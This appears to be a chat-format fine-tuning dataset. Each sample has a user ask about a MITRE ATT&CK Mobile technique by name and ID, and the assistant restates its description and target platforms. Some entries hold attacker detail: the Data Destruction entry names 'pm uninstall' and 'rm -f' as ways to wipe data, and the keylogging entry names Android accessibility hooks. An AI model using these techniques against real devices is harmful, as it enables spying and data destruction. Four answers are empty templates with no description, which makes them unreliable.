{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Keychain' and with the Id: T1634.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Keychain' and with the Id: T1634.001 is described as follows: Adversaries may collect keychain data from an iOS device to acquire credentials. Keychains are the built-in way for iOS to keep track of users' passwords and credentials for many services and features such as Wi-Fi passwords, websites, secure notes, certificates, private keys, and VPN credentials. On the device, the keychain database is stored outside of application sandboxes to prevent unauthorized access to the raw data. Standard iOS APIs allow applications access to their own keychain contained within the database. By utilizing a privilege escalation exploit or existing root access, adversaries can access the entire encrypted database.(Citation: Apple Keychain Services)(Citation: Elcomsoft Decrypt Keychain) . The systems targeted by this attack pattern are: iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Modify Cached Executable Code' and with the Id: T1403 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Modify Cached Executable Code' and with the Id: T1403 is described as follows: ART (the Android Runtime) compiles optimized code on the device itself to improve performance. An adversary may be able to use escalated privileges to modify the cached code in order to hide malicious behavior. Since the code is compiled on the device, it may not receive the same level of integrity checks that are provided to code running in the system partition.(Citation: Sabanal-ART). The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Device Type Discovery' and with the Id: T1419 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Device Type Discovery' and with the Id: T1419 is described as follows: On Android, device type information is accessible to apps through the android.os.Build class (Citation: Android-Build). Device information could be used to target privilege escalation exploits.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Uninstall Malicious Application' and with the Id: T1576 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Uninstall Malicious Application' and with the Id: T1576 is described as follows: Adversaries may include functionality in malware that uninstalls the malicious application from the device. This can be achieved by:* Abusing device owner permissions to perform silent uninstallation using device owner API calls.* Abusing root permissions to delete files from the filesystem.* Abusing the accessibility service. This requires an intent be sent to the system to request uninstallation, and then abusing the accessibility service to click the proper places on the screen to confirm uninstallation.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Delete Device Data' and with the Id: T1447 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Delete Device Data' and with the Id: T1447 is described as follows: Adversaries may wipe a device or delete individual files in order to manipulate external outcomes or hide activity. An application must have administrator access to fully wipe the device, while individual files may not require special permissions to delete depending on their storage location. (Citation: Android DevicePolicyManager 2019)Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The impact file deletion will have depends on the type of data as well as the goals and objectives of the adversary, but can include deleting update files to evade detection or deleting attacker-specified files for impact.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Carrier Billing Fraud' and with the Id: T1448 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Carrier Billing Fraud' and with the Id: T1448 is described as follows: A malicious app may trigger fraudulent charges on a victim\u2019s carrier billing statement in several different ways, including SMS toll fraud and SMS shortcodes that make purchases.Performing SMS fraud relies heavily upon the fact that, when making SMS purchases, the carriers perform device verification but not user verification. This allows adversaries to make purchases on behalf of the user, with little or no user interaction.(Citation: Google Bread)Malicious applications may also perform toll billing, which occurs when carriers provide payment endpoints over a web page. The application connects to the web page over cellular data so the carrier can directly verify the number, or the application must retrieve a code sent via SMS and enter it into the web page.(Citation: Google Bread)On iOS, apps cannot send SMS messages.On Android, apps must hold the `SEND_SMS` permission to send SMS messages. Additionally, Android version 4.2 and above has mitigations against this threat by requiring user consent before allowing SMS messages to be sent to premium numbers (Citation: AndroidSecurity2014).. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'URL Scheme Hijacking' and with the Id: T1415 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'URL Scheme Hijacking' and with the Id: T1415 is described as follows: An iOS application may be able to maliciously claim a URL scheme, allowing it to intercept calls that are meant for a different application(Citation: FireEye-Masque2)(Citation: Dhanjani-URLScheme). This technique, for example, could be used to capture OAuth authorization codes(Citation: IETF-PKCE) or to phish user credentials(Citation: MobileIron-XARA).. The systems targeted by this attack pattern are: iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Bidirectional Communication' and with the Id: T1481.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Bidirectional Communication' and with the Id: T1481.002 is described as follows: Adversaries may use an existing, legitimate external Web service channel as a means for sending commands to and receiving output from a compromised system. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet.  Popular websites and social media, acting as a mechanism for C2, may give a significant amount of cover. This is due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Non-Standard Port' and with the Id: T1509 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Non-Standard Port' and with the Id: T1509 is described as follows: Adversaries may generate network traffic using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Compromise Software Supply Chain' and with the Id: T1474.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Compromise Software Supply Chain' and with the Id: T1474.003 is described as follows: Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Dead Drop Resolver' and with the Id: T1481.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Dead Drop Resolver' and with the Id: T1481.001 is described as follows: Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.  Popular websites and social media, acting as a mechanism for C2, may give a significant amount of cover. This is due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.  Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis, or enable operational resiliency (since this infrastructure may be dynamically changed). . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Location Tracking' and with the Id: T1430 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Location Tracking' and with the Id: T1430 is described as follows: Adversaries may track a device\u2019s physical location through use of standard operating system APIs via malicious or exploited applications on the compromised device.  On Android, applications holding the `ACCESS_COAURSE_LOCATION` or `ACCESS_FINE_LOCATION` permissions provide access to the device\u2019s physical location. On Android 10 and up, declaration of the `ACCESS_BACKGROUND_LOCATION` permission in an application\u2019s manifest will allow applications to request location access even when the application is running in the background.(Citation: Android Request Location Permissions) Some adversaries have utilized integration of Baidu map services to retrieve geographical location once the location access permissions had been obtained.(Citation: PaloAlto-SpyDealer)(Citation: Palo Alto HenBox)  On iOS, applications must include the `NSLocationWhenInUseUsageDescription`, `NSLocationAlwaysAndWhenInUseUsageDescription`, and/or `NSLocationAlwaysUsageDescription` keys in their `Info.plist` file depending on the extent of requested access to location information.(Citation: Apple Requesting Authorization for Location Services) On iOS 8.0 and up, applications call `requestWhenInUseAuthorization()` to request access to location information when the application is in use or `requestAlwaysAuthorization()` to request access to location information regardless of whether the application is in use. With elevated privileges, an adversary may be able to access location data without explicit user consent with the `com.apple.locationd.preauthorized` entitlement key.(Citation: Google Project Zero Insomnia). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Device Administrator Permissions' and with the Id: T1626.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Device Administrator Permissions' and with the Id: T1626.001 is described as follows: Adversaries may abuse Android\u2019s device administration API to obtain a higher degree of control over the device. By abusing the API, adversaries can perform several nefarious actions, such as resetting the device\u2019s password for [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1642), factory resetting the device for [File Deletion](https://attack.mitre.org/techniques/T1630/002) and to delete any traces of the malware, disabling all the device\u2019s cameras, or to make it more difficult to uninstall the app.Device administrators must be approved by the user at runtime, with a system popup showing which actions have been requested by the app. In conjunction with other techniques, such as [Input Injection](https://attack.mitre.org/techniques/T1516), an app can programmatically grant itself administrator permissions without any user input.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Device Lockout' and with the Id: T1446 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Device Lockout' and with the Id: T1446 is described as follows: An adversary may seek to lock the legitimate user out of the device, for example to inhibit user interaction or to obtain a ransom payment.On Android versions prior to 7, apps can abuse Device Administrator access to reset the device lock passcode to prevent the user from unlocking the device. After Android 7, only device or profile owners (e.g. MDMs) can reset the device\u2019s passcode.(Citation: Android resetPassword)On iOS devices, this technique does not work because mobile device management servers can only remove the screen lock passcode, they cannot set a new passcode. However, on jailbroken devices, malware has been discovered that can lock the user out of the device.(Citation: Xiao-KeyRaider). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Remote Device Management Services' and with the Id: T1430.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Remote Device Management Services' and with the Id: T1430.001 is described as follows: An adversary may use access to cloud services (e.g. Google's Android Device Manager or Apple iCloud's Find my iPhone) or to an enterprise mobility management (EMM)/mobile device management (MDM) server console to track the location of mobile devices managed by the service.(Citation: Krebs-Location) . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data Destruction' and with the Id: T1662 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data Destruction' and with the Id: T1662 is described as follows: Adversaries may destroy data and files on specific devices or in large numbers to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.  To achieve data destruction, adversaries may use the `pm uninstall` command to uninstall packages or the `rm` command to remove specific files. For example, adversaries may first use `pm uninstall` to uninstall non-system apps, and then use `rm (-f) <file(s)>` to delete specific files, further hiding malicious activity.(Citation: rootnik_rooting_tool)(Citation: abuse_native_linux_tools). The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Attack PC via USB Connection' and with the Id: T1427 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Attack PC via USB Connection' and with the Id: T1427 is described as follows: With escalated privileges, an adversary could program the mobile device to impersonate USB devices such as input devices (keyboard and mouse), storage devices, and/or networking devices in order to attack a physically connected PC(Citation: Wang-ExploitingUSB)(Citation: ArsTechnica-PoisonTap) This technique has been demonstrated on Android. We are unaware of any demonstrations on iOS.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Stolen Developer Credentials or Signing Keys' and with the Id: T1441 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Stolen Developer Credentials or Signing Keys' and with the Id: T1441 is described as follows: . The systems targeted by this attack pattern are:  ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Rogue Cellular Base Station' and with the Id: T1467 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Rogue Cellular Base Station' and with the Id: T1467 is described as follows: An adversary could set up a rogue cellular base station and then use it to eavesdrop on or manipulate cellular device communication. A compromised cellular femtocell could be used to carry out this technique(Citation: Computerworld-Femtocell).. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'SIM Card Swap' and with the Id: T1451 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'SIM Card Swap' and with the Id: T1451 is described as follows: An adversary could convince the mobile network operator (e.g. through social networking, forged identification, or insider attacks performed by trusted employees) to issue a new SIM card and associate it with an existing phone number and account.(Citation: NYGov-Simswap)(Citation: Motherboard-Simswap2) The adversary could then obtain SMS messages or hijack phone calls intended for someone else.(Citation: Betanews-Simswap)One use case is intercepting authentication messages or phone calls to obtain illicit access to online banking or other online accounts, as many online services allow account password resets by sending an authentication code over SMS to a phone number associated with the account.(Citation: Guardian-Simswap)(Citation: Motherboard-Simswap1)(Citation: Krebs-SimSwap)(Citation: TechCrunch-SimSwap). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Input Capture' and with the Id: T1417 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Input Capture' and with the Id: T1417 is described as follows: Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal device usage, users often provide credentials to various locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. [Keylogging](https://attack.mitre.org/techniques/T1417/001)) or rely on deceiving the user into providing input into what they believe to be a genuine application prompt (e.g. [GUI Input Capture](https://attack.mitre.org/techniques/T1417/002)).. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Generate Traffic from Victim' and with the Id: T1643 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Generate Traffic from Victim' and with the Id: T1643 is described as follows: Adversaries may generate outbound traffic from devices. This is typically performed to manipulate external outcomes, such as to achieve carrier billing fraud or to manipulate app store rankings or ratings. Outbound traffic is typically generated as SMS messages or general web traffic, but may take other forms as well.If done via SMS messages, Android apps must hold the `SEND_SMS` permission. Additionally, sending an SMS message requires user consent if the recipient is a premium number. Applications cannot send SMS messages on iOS. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Disguise Root/Jailbreak Indicators' and with the Id: T1630.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Disguise Root/Jailbreak Indicators' and with the Id: T1630.003 is described as follows: An adversary could use knowledge of the techniques used by security software to evade detection.(Citation: Brodie)(Citation: Tan) For example, some mobile security products perform compromised device detection by searching for particular artifacts such as an installed \"su\" binary, but that check could be evaded by naming the binary something else. Similarly, polymorphic code techniques could be used to evade signature-based detection.(Citation: Rastogi). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Masquerade as Legitimate Application' and with the Id: T1444 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Masquerade as Legitimate Application' and with the Id: T1444 is described as follows: An adversary could distribute developed malware by masquerading the malware as a legitimate application. This can be done in two different ways: by embedding the malware in a legitimate application, or by pretending to be a legitimate application.Embedding the malware in a legitimate application is done by downloading the application, disassembling it, adding the malicious code, and then re-assembling it.(Citation: Zhou) The app would appear to be the original app, but would contain additional malicious functionality. The adversary could then publish the malicious application to app stores or use another delivery method.Pretending to be a legitimate application relies heavily on lack of scrutinization by the user. Typically, a malicious app pretending to be a legitimate one will have many similar details as the legitimate one, such as name, icon, and description.(Citation: Palo Alto HenBox)Malicious applications may also masquerade as legitimate applications when requesting access to the accessibility service in order to appear as legitimate to the user, increasing the likelihood that the access will be granted.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Malicious Media Content' and with the Id: T1457 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Malicious Media Content' and with the Id: T1457 is described as follows: . The systems targeted by this attack pattern are:  ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Calendar Entries' and with the Id: T1636.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Calendar Entries' and with the Id: T1636.001 is described as follows: Adversaries may utilize standard operating system APIs to gather calendar entry data. On Android, this can be accomplished using the Calendar Content Provider. On iOS, this can be accomplished using the `EventKit` framework.  If the device has been jailbroken or rooted, an adversary may be able to access [Calendar Entries](https://attack.mitre.org/techniques/T1636/001) without the user\u2019s knowledge or approval. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'File Deletion' and with the Id: T1630.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'File Deletion' and with the Id: T1630.002 is described as follows: Adversaries may wipe a device or delete individual files in order to manipulate external outcomes or hide activity. An application must have administrator access to fully wipe the device, while individual files may not require special permissions to delete depending on their storage location.(Citation: Android DevicePolicyManager 2019) Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The impact file deletion will have depends on the type of data as well as the goals and objectives of the adversary, but can include deleting update files to evade detection or deleting attacker-specified files for impact.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Device Lockout' and with the Id: T1629.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Device Lockout' and with the Id: T1629.002 is described as follows: An adversary may seek to inhibit user interaction by locking the legitimate user out of the device. This is typically accomplished by requesting device administrator permissions and then locking the screen using `DevicePolicyManager.lockNow()`. Other novel techniques for locking the user out of the device have been observed, such as showing a persistent overlay, using carefully crafted \u201ccall\u201d notification screens, and locking HTML pages in the foreground. These techniques can be very difficult to get around, and typically require booting the device into safe mode to uninstall the malware.(Citation: Microsoft MalLockerB)(Citation: Talos GPlayed)(Citation: securelist rotexy 2018)Prior to Android 7, device administrators were able to reset the device lock passcode to prevent the user from unlocking the device. The release of Android 7 introduced updates that only allow device or profile owners (e.g. MDMs) to reset the device\u2019s passcode.(Citation: Android resetPassword). The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Keylogging' and with the Id: T1417.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Keylogging' and with the Id: T1417.001 is described as follows: Adversaries may log user keystrokes to intercept credentials or other information from the user as the user types them.Some methods of keylogging include:* Masquerading as a legitimate third-party keyboard to record user keystrokes.(Citation: Zeltser-Keyboard) On both Android and iOS, users must explicitly authorize the use of third-party keyboard apps. Users should be advised to use extreme caution before granting this authorization when it is requested.* Abusing accessibility features. On Android, adversaries may abuse accessibility features to record keystrokes by registering an `AccessibilityService` class, overriding the `onAccessibilityEvent` method, and listening for the `AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED` event type. The event object passed into the function will contain the data that the user typed. *Additional methods of keylogging may be possible if root access is available. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'SMS Control' and with the Id: T1582 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'SMS Control' and with the Id: T1582 is described as follows: Adversaries may delete, alter, or send SMS messages without user authorization. This could be used to hide C2 SMS messages, spread malware, or various external effects.This can be accomplished by requesting the `RECEIVE_SMS` or `SEND_SMS` permissions depending on what the malware is attempting to do. If the app is set as the default SMS handler on the device, the `SMS_DELIVER` broadcast intent can be registered, which allows the app to write to the SMS content provider. The content provider directly modifies the messaging database on the device, which could allow malicious applications with this ability to insert, modify, or delete arbitrary messages on the device.(Citation: SMS KitKat)(Citation: Android SmsProvider). The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Disguise Root/Jailbreak Indicators' and with the Id: T1408 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Disguise Root/Jailbreak Indicators' and with the Id: T1408 is described as follows: An adversary could use knowledge of the techniques used by security software to evade detection(Citation: Brodie)(Citation: Tan). For example, some mobile security products perform compromised device detection by searching for particular artifacts such as an installed \"su\" binary, but that check could be evaded by naming the binary something else. Similarly, polymorphic code techniques could be used to evade signature-based detection(Citation: Rastogi).. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exfiltration Over Other Network Medium' and with the Id: T1438 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exfiltration Over Other Network Medium' and with the Id: T1438 is described as follows: Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a standard Internet connection, the exfiltration may occur, for example, via Bluetooth, or another radio frequency (RF) channel. Adversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Detect App Analysis Environment' and with the Id: T1440 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Detect App Analysis Environment' and with the Id: T1440 is described as follows: . The systems targeted by this attack pattern are:  ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Process Injection' and with the Id: T1631 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Process Injection' and with the Id: T1631 is described as follows: Adversaries may inject code into processes in order to evade process-based defenses or even elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. Both Android and iOS have no legitimate way to achieve process injection. The only way this is possible is by abusing existing root access or exploiting a vulnerability.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Malicious Software Development Tools' and with the Id: T1462 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Malicious Software Development Tools' and with the Id: T1462 is described as follows: . The systems targeted by this attack pattern are:  ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Symmetric Cryptography' and with the Id: T1521.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Symmetric Cryptography' and with the Id: T1521.001 is described as follows: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic, rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, Blowfish, and RC4.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Broadcast Receivers' and with the Id: T1402 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Broadcast Receivers' and with the Id: T1402 is described as follows: An intent is a message passed between Android application or system components. Applications can register to receive broadcast intents at runtime, which are system-wide intents delivered to each app when certain events happen on the device, such as network changes or the user unlocking the screen. Malicious applications can then trigger certain actions within the app based on which broadcast intent was received.Further, malicious applications can register for intents broadcasted by other applications in addition to the Android system itself. This allows the malware to respond based on actions in other applications. This behavior typically indicates a more intimate knowledge, or potentially the targeting of specific devices, users, or applications.In Android 8 (API level 26), broadcast intent behavior was changed, limiting the implicit intents that applications can register for in the manifest. In most cases, applications that register through the manifest will no longer receive the broadcasts. Now, applications must register context-specific broadcast receivers while the user is actively using the app.(Citation: Android Changes to System Broadcasts). The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Wi-Fi Discovery' and with the Id: T1422.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Wi-Fi Discovery' and with the Id: T1422.002 is described as follows: Adversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part of [Discovery](https://attack.mitre.org/tactics/TA0032) or [Credential Access](https://attack.mitre.org/tactics/TA0031) activity to support both ongoing and future campaigns. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Compromise Hardware Supply Chain' and with the Id: T1474.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Compromise Hardware Supply Chain' and with the Id: T1474.002 is described as follows: Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Clipboard Data' and with the Id: T1414 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Clipboard Data' and with the Id: T1414 is described as follows: Adversaries may abuse clipboard manager APIs to obtain sensitive information copied to the device clipboard. For example, passwords being copied and pasted from a password manager application could be captured by a malicious application installed on the device.(Citation: Fahl-Clipboard)  On Android, applications can use the `ClipboardManager.OnPrimaryClipChangedListener()` API to register as a listener and monitor the clipboard for changes. However, starting in Android 10, this can only be used if the application is in the foreground, or is set as the device\u2019s default input method editor (IME).(Citation: Github Capture Clipboard 2019)(Citation: Android 10 Privacy Changes)  On iOS, this can be accomplished by accessing the `UIPasteboard.general.string` field. However, starting in iOS 14, upon accessing the clipboard, the user will be shown a system notification if the accessed text originated in a different application. For example, if the user copies the text of an iMessage from the Messages application, the notification will read \u201capplication_name has pasted from Messages\u201d when the text was pasted in a different application.(Citation: UIPPasteboard). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Modify System Partition' and with the Id: T1400 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Modify System Partition' and with the Id: T1400 is described as follows: If an adversary can escalate privileges, he or she may be able to use those privileges to place malicious code in the device system partition, where it may persist after device resets and may not be easily removed by the device user.Many Android devices provide the ability to unlock the bootloader for development purposes. An unlocked bootloader may provide the ability for an adversary to modify the system partition. Even if the bootloader is locked, it may be possible for an adversary to escalate privileges and then modify the system partition.. The systems targeted by this attack pattern are: Android, iOS ."}]}
